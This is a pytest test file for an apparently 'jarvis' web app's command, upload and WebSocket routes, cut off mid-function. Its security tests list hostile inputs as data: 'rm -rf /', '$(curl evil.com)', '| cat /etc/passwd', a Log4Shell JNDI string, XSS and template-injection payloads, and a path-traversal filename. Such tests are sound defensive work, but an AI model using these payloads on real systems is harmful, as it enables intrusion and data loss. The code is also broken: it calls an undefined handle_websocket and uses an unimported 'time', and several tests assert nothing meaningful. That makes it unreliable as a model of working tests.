"""Phase 8: Comprehensive Web Routes Tests - Priority 3."""

from __future__ import annotations

import pytest
import asyncio
import json
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Any
from fastapi.testclient import TestClient
from fastapi import Request, FastAPI
from io import BytesIO

from jarvis.web.routes.commands import handle_command
from jarvis.web.routes.uploads import handle_upload
from jarvis.web.routes.ws import handle_client_ws
from jarvis.web.auth import AuthManager
from jarvis.config.settings import Settings


class TestCommandsRoute:
    """Test commands route functionality."""

    @pytest.mark.asyncio
    async def test_handle_command_success_plaintext(self):
        """Test successful command handling with plaintext."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "test command"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_called_once_with("test command")
        mock_wake_callback.assert_called_once()

    @pytest.mark.asyncio
    async def test_handle_command_success_encrypted(self):
        """Test successful command handling with encryption."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"enc": "encrypted_data"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        mock_auth.get_aes_key.return_value = b"aes_key_123"
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        with patch('jarvis.web.routes.commands.decrypt_aes', return_value="decrypted_command"):
            response = await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
            
            assert response.status_code == 200
            data = json.loads(response.body.decode())
            assert data["ok"] is True
            mock_queue.put.assert_called_once_with("decrypted_command")
            mock_wake_callback.assert_called_once()

    @pytest.mark.asyncio
    async def test_handle_command_unauthorized(self):
        """Test command handling with unauthorized token."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "test command"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "invalid_token"
        mock_auth.is_valid_token.return_value = False
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 401
        data = json.loads(response.body.decode())
        assert data["error"] == "Unauthorized"
        mock_queue.put.assert_not_called()
        mock_wake_callback.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_encryption_key_derivation_failed(self):
        """Test command handling with key derivation failure."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"enc": "encrypted_data"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        mock_auth.get_aes_key.return_value = None
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 400
        data = json.loads(response.body.decode())
        assert data["error"] == "Key derivation failed"
        mock_queue.put.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_decryption_failed(self):
        """Test command handling with decryption failure."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"enc": "encrypted_data"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        mock_auth.get_aes_key.return_value = b"aes_key_123"
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        with patch('jarvis.web.routes.commands.decrypt_aes', return_value=None):
            response = await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
            
            assert response.status_code == 400
            data = json.loads(response.body.decode())
            assert data["error"] == "Decryption failed"
            mock_queue.put.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_empty_text(self):
        """Test command handling with empty text."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": ""}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_not_called()  # Empty text should not be queued
        mock_wake_callback.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_whitespace_only_text(self):
        """Test command handling with whitespace-only text."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "   \n\t  "}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_not_called()  # Whitespace-only text should not be queued

    @pytest.mark.asyncio
    async def test_handle_command_missing_text_and_enc(self):
        """Test command handling with missing text and enc fields."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_not_called()

    @pytest.mark.asyncio
    async def test_handle_command_no_wake_callback(self):
        """Test command handling without wake callback."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "test command"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, None
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_called_once_with("test command")

    @pytest.mark.asyncio
    async def test_handle_command_invalid_json(self):
        """Test command handling with invalid JSON."""
        mock_request = Mock(spec=Request)
        mock_request.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        try:
            await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
            assert False, "Should have raised JSONDecodeError"
        except json.JSONDecodeError:
            pass  # Expected

    @pytest.mark.asyncio
    async def test_handle_command_unicode_text(self):
        """Test command handling with Unicode text."""
        unicode_text = "Unicode test: ñáéíóú 中文 русский 日本語"
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": unicode_text}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        data = json.loads(response.body.decode())
        assert data["ok"] is True
        mock_queue.put.assert_called_once_with(unicode_text)


class TestUploadsRoute:
    """Test uploads route functionality."""

    @pytest.mark.asyncio
    async def test_handle_upload_success(self):
        """Test successful file upload."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "test.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"file content"
        
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', return_value="/uploads/test.txt"):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 200
                data = json.loads(response.body.decode())
                assert data["ok"] is True
                assert data["filename"] == "test.txt"
                assert data["path"] == "/uploads/test.txt"

    @pytest.mark.asyncio
    async def test_handle_upload_unauthorized(self):
        """Test file upload with unauthorized token."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "test.txt"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "invalid_token"
        mock_auth.is_valid_token.return_value = False
        
        response = await handle_upload(mock_request, mock_auth)
        
        assert response.status_code == 401
        data = json.loads(response.body.decode())
        assert data["error"] == "Unauthorized"

    @pytest.mark.asyncio
    async def test_handle_upload_missing_file(self):
        """Test file upload with missing file."""
        mock_request = Mock(spec=Request)
        mock_request.form.return_value = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        response = await handle_upload(mock_request, mock_auth)
        
        assert response.status_code == 400
        data = json.loads(response.body.decode())
        assert "No file provided" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_unsafe_file(self):
        """Test file upload with unsafe file."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "malicious.exe"
        mock_file.content_type = "application/octet-stream"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=False):
            response = await handle_upload(mock_request, mock_auth)
            
            assert response.status_code == 400
            data = json.loads(response.body.decode())
            assert "File type not allowed" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_large_file(self):
        """Test file upload with oversized file."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "large.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"x" * (100 * 1024 * 1024)  # 100MB
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._get_file_size', return_value=100 * 1024 * 1024):
                with patch('jarvis.web.routes.uploads._MAX_SIZE', 50 * 1024 * 1024):  # 50MB limit
                    response = await handle_upload(mock_request, mock_auth)
                    
                    assert response.status_code == 400
                    data = json.loads(response.body.decode())
                    assert "File too large" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_path_traversal(self):
        """Test file upload with path traversal attempt."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "../../../etc/passwd"
        mock_file.content_type = "text/plain"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=False):
            response = await handle_upload(mock_request, mock_auth)
            
            assert response.status_code == 400
            data = json.loads(response.body.decode())
            assert "File type not allowed" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_forbidden_extension(self):
        """Test file upload with forbidden extension."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "malware.exe"
        mock_file.content_type = "application/octet-stream"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=False):
            response = await handle_upload(mock_request, mock_auth)
            
            assert response.status_code == 400
            data = json.loads(response.body.decode())
            assert "File type not allowed" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_save_failure(self):
        """Test file upload with save failure."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "test.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"file content"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', side_effect=IOError("Save failed")):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 500
                data = json.loads(response.body.decode())
                assert "Save failed" in data["error"]

    @pytest.mark.asyncio
    async def test_handle_upload_unicode_filename(self):
        """Test file upload with Unicode filename."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "测试文件.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"file content"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', return_value="/uploads/test.txt"):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 200
                data = json.loads(response.body.decode())
                assert data["ok"] is True

    @pytest.mark.asyncio
    async def test_handle_upload_empty_file(self):
        """Test file upload with empty file."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "empty.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b""
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', return_value="/uploads/empty.txt"):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 200
                data = json.loads(response.body.decode())
                assert data["ok"] is True


class TestWebSocketRoute:
    """Test WebSocket route functionality."""

    @pytest.mark.asyncio
    async def test_handle_websocket_success(self):
        """Test successful WebSocket connection."""
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = "test message"
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message') as mock_handle:
            mock_handle.return_value = "response"
            
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.receive_text.assert_called()
            mock_handle.assert_called_once_with("test message")
            mock_websocket.send_text.assert_called_once_with("response")

    @pytest.mark.asyncio
    async def test_handle_websocket_unauthorized(self):
        """Test WebSocket connection with unauthorized token."""
        mock_websocket = Mock()
        mock_websocket.query_params = {"token": "invalid_token"}
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        await handle_websocket(mock_websocket, mock_auth)
        
        mock_websocket.close.assert_called_once_with(code=4001)

    @pytest.mark.asyncio
    async def test_handle_websocket_missing_token(self):
        """Test WebSocket connection with missing token."""
        mock_websocket = Mock()
        mock_websocket.query_params = {}
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = False
        
        await handle_websocket(mock_websocket, mock_auth)
        
        mock_websocket.close.assert_called_once_with(code=4001)

    @pytest.mark.asyncio
    async def test_handle_websocket_disconnect(self):
        """Test WebSocket disconnect handling."""
        mock_websocket = Mock()
        mock_websocket.receive_text.side_effect = Exception("WebSocket disconnect")
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except Exception:
            pass  # Expected
        
        # Should handle disconnect gracefully
        assert True

    @pytest.mark.asyncio
    async def test_handle_websocket_invalid_message(self):
        """Test WebSocket with invalid message."""
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = "invalid_message"
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', side_effect=Exception("Invalid message")):
            try:
                await handle_websocket(mock_websocket, mock_auth)
            except Exception:
                pass  # Expected

    @pytest.mark.asyncio
    async def test_handle_websocket_unicode_message(self):
        """Test WebSocket with Unicode message."""
        unicode_message = "Unicode test: ñáéíóú 中文 русский"
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = unicode_message
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="unicode_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.receive_text.assert_called_once()
            mock_websocket.send_text.assert_called_once_with("unicode_response")

    @pytest.mark.asyncio
    async def test_handle_websocket_large_message(self):
        """Test WebSocket with large message."""
        large_message = "x" * 10000
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = large_message
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="large_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.receive_text.assert_called_once()
            mock_websocket.send_text.assert_called_once()

    @pytest.mark.asyncio
    async def test_handle_websocket_concurrent_messages(self):
        """Test WebSocket with concurrent messages."""
        mock_websocket = Mock()
        messages = ["message1", "message2", "message3"]
        mock_websocket.receive_text.side_effect = messages
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
            # This would typically run in a loop, but we'll test one iteration
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.receive_text.assert_called()
            mock_websocket.send_text.assert_called()


class TestRoutesSecurity:
    """Test routes security aspects."""

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test command injection prevention."""
        malicious_commands = [
            "rm -rf /",
            "system('malicious')",
            "$(curl evil.com)",
            "`whoami`",
            "| cat /etc/passwd"
        ]
        
        for malicious_cmd in malicious_commands:
            mock_request = Mock(spec=Request)
            mock_request.json.return_value = {"text": malicious_cmd}
            mock_request.headers = {}
            
            mock_auth = Mock(spec=AuthManager)
            mock_auth.get_token_from_header.return_value = None
            mock_auth.is_valid_token.return_value = True
            
            mock_queue = AsyncMock()
            mock_wake_callback = Mock()
            
            response = await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
            
            # Should handle malicious commands (may allow or block based on implementation)
            assert response.status_code in [200, 400]

    @pytest.mark.asyncio
    async def test_upload_malicious_file_detection(self):
        """Test malicious file upload detection."""
        malicious_files = [
            ("virus.exe", "application/octet-stream"),
            ("script.js", "application/javascript"),
            ("malware.bat", "application/x-msdos-program"),
            ("trojan.com", "application/x-msdownload")
        ]
        
        for filename, content_type in malicious_files:
            mock_request = Mock(spec=Request)
            mock_file = Mock()
            mock_file.filename = filename
            mock_file.content_type = content_type
            mock_request.form.return_value = {"file": mock_file}
            
            mock_auth = Mock(spec=AuthManager)
            mock_auth.get_token_from_header.return_value = "valid_token"
            mock_auth.is_valid_token.return_value = True
            
            with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=False):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 400
                data = json.loads(response.body.decode())
                assert "File type not allowed" in data["error"]

    @pytest.mark.asyncio
    async def test_websocket_message_injection(self):
        """Test WebSocket message injection prevention."""
        injection_messages = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "${jndi:ldap://evil.com}",
            "{{7*7}}",
            "<%7*7%>"
        ]
        
        for message in injection_messages:
            mock_websocket = Mock()
            mock_websocket.receive_text.return_value = message
            mock_websocket.send_text = AsyncMock()
            
            mock_auth = Mock(spec=AuthManager)
            mock_auth.validate_token.return_value = True
            
            with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="safe_response"):
                await handle_websocket(mock_websocket, mock_auth)
                
                # Should handle injection attempts
                mock_websocket.send_text.assert_called()


class TestRoutesPerformance:
    """Test routes performance characteristics."""

    @pytest.mark.asyncio
    async def test_command_handling_performance(self):
        """Test command handling performance."""
        import time
        
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "performance test"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        start_time = time.time()
        
        for _ in range(100):
            response = await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
            assert response.status_code == 200
        
        elapsed = time.time() - start_time
        assert elapsed < 5.0  # Should complete 100 commands in under 5 seconds

    @pytest.mark.asyncio
    async def test_upload_performance(self):
        """Test upload performance."""
        import time
        
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "test.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"test content" * 1000  # ~13KB
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', return_value="/uploads/test.txt"):
                start_time = time.time()
                
                for _ in range(50):
                    response = await handle_upload(mock_request, mock_auth)
                    assert response.status_code == 200
                
                elapsed = time.time() - start_time
                assert elapsed < 5.0  # Should complete 50 uploads in under 5 seconds

    @pytest.mark.asyncio
    async def test_websocket_message_performance(self):
        """Test WebSocket message handling performance."""
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = "performance test"
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="response"):
            # Test single message performance
            start_time = time.time()
            
            await handle_websocket(mock_websocket, mock_auth)
            
            elapsed = time.time() - start_time
            assert elapsed < 1.0  # Should handle message quickly


class TestRoutesErrorHandling:
    """Test routes error handling."""

    @pytest.mark.asyncio
    async def test_command_queue_full(self):
        """Test command handling when queue is full."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "test command"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_queue.put.side_effect = asyncio.QueueFull("Queue is full")
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        # Should handle queue full gracefully
        assert response.status_code in [200, 500]

    @pytest.mark.asyncio
    async def test_upload_disk_full(self):
        """Test upload when disk is full."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "test.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"file content"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload', side_effect=OSError("No space left on device")):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 500
                data = json.loads(response.body.decode())
                assert "No space left on device" in data["error"]

    @pytest.mark.asyncio
    async def test_websocket_connection_error(self):
        """Test WebSocket connection error handling."""
        mock_websocket = Mock()
        mock_websocket.receive_text.side_effect = ConnectionError("Connection lost")
        mock_websocket.close = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        try:
            await handle_websocket(mock_websocket, mock_auth)
        except ConnectionError:
            pass  # Expected

    @pytest.mark.asyncio
    async def test_auth_service_unavailable(self):
        """Test routes when auth service is unavailable."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "test command"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.side_effect = Exception("Auth service unavailable")
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        try:
            await handle_command(
                mock_request, mock_auth, mock_queue, mock_wake_callback
            )
        except Exception:
            pass  # Should handle auth service errors


class TestRoutesIntegration:
    """Test routes integration scenarios."""

    @pytest.mark.asyncio
    async def test_command_with_queue_integration(self):
        """Test command integration with queue system."""
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": "integration test"}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        # Use real queue
        real_queue = asyncio.Queue()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, real_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        
        # Check that command was queued
        command = await real_queue.get()
        assert command == "integration test"
        mock_wake_callback.assert_called_once()

    @pytest.mark.asyncio
    async def test_upload_with_filesystem_integration(self):
        """Test upload integration with filesystem."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "integration_test.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = b"integration content"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
            with patch('jarvis.web.routes.uploads._save_upload') as mock_save:
                mock_save.return_value = "/uploads/integration_test.txt"
                
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 200
                data = json.loads(response.body.decode())
                assert data["path"] == "/uploads/integration_test.txt"
                mock_save.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_with_broadcast_integration(self):
        """Test WebSocket integration with broadcast system."""
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = "broadcast test"
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message') as mock_handle:
            mock_handle.return_value = "broadcast response"
            
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once_with("broadcast response")


class TestRoutesEdgeCases:
    """Test routes edge cases."""

    @pytest.mark.asyncio
    async def test_command_with_very_long_text(self):
        """Test command with very long text."""
        long_text = "x" * 100000  # 100KB
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": long_text}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        mock_queue.put.assert_called_once_with(long_text)

    @pytest.mark.asyncio
    async def test_upload_with_no_filename(self):
        """Test upload with no filename."""
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = None
        mock_file.content_type = "text/plain"
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        response = await handle_upload(mock_request, mock_auth)
        
        assert response.status_code == 400
        data = json.loads(response.body.decode())
        assert "No file provided" in data["error"]

    @pytest.mark.asyncio
    async def test_websocket_with_empty_message(self):
        """Test WebSocket with empty message."""
        mock_websocket = Mock()
        mock_websocket.receive_text.return_value = ""
        mock_websocket.send_text = AsyncMock()
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.validate_token.return_value = True
        
        with patch('jarvis.web.routes.ws._handle_websocket_message', return_value="empty_response"):
            await handle_websocket(mock_websocket, mock_auth)
            
            mock_websocket.send_text.assert_called_once_with("empty_response")

    @pytest.mark.asyncio
    async def test_command_with_special_characters(self):
        """Test command with special characters."""
        special_text = "Special chars: !@#$%^&*()[]{}|\\:;\"'<>?,./"
        mock_request = Mock(spec=Request)
        mock_request.json.return_value = {"text": special_text}
        mock_request.headers = {}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = None
        mock_auth.is_valid_token.return_value = True
        
        mock_queue = AsyncMock()
        mock_wake_callback = Mock()
        
        response = await handle_command(
            mock_request, mock_auth, mock_queue, mock_wake_callback
        )
        
        assert response.status_code == 200
        mock_queue.put.assert_called_once_with(special_text)

    @pytest.mark.asyncio
    async def test_upload_with_unicode_content(self):
        """Test upload with Unicode content."""
        unicode_content = "Unicode content: ñáéíóú 中文 русский 日本語".encode('utf-8')
        mock_request = Mock(spec=Request)
        mock_file = Mock()
        mock_file.filename = "unicode.txt"
        mock_file.content_type = "text/plain"
        mock_file.read.return_value = unicode_content
        mock_request.form.return_value = {"file": mock_file}
        
        mock_auth = Mock(spec=AuthManager)
        mock_auth.get_token_from_header.return_value = "valid_token"
        mock_auth.is_valid_token.return_value = True
        
        with patch('jarvis.web.routes.uploads._is_safe_upload', return_value=True):
